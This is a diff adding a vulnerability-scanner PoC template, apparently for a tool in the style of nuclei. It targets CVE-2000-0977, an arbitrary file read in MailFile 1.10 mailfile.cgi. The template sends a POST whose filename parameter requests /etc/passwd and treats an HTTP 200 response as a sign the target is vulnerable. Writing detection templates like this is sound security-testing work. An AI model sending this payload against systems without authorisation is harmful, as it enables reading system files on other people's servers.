@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "验证目标服务器是否存在 MailFile 1.10 mailfile.cgi 任意文件读取漏洞。向 mailfile.cgi 发送 POST 请求，通过 filename 参数指定目标文件路径，若 CGI 脚本响应正常则表明目标存在该漏洞风险。"
+id = "POC-AVE-2000-0713"
+name = "Oatmeal Studios MailFile 1.10 mailfile.cgi 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0713"]
+vuln_id = [
+    "CVE-2000-0977",
+    "AVE-2000-0713",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/mailfile.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "real_name=test&email=test@test.com&filename=/etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
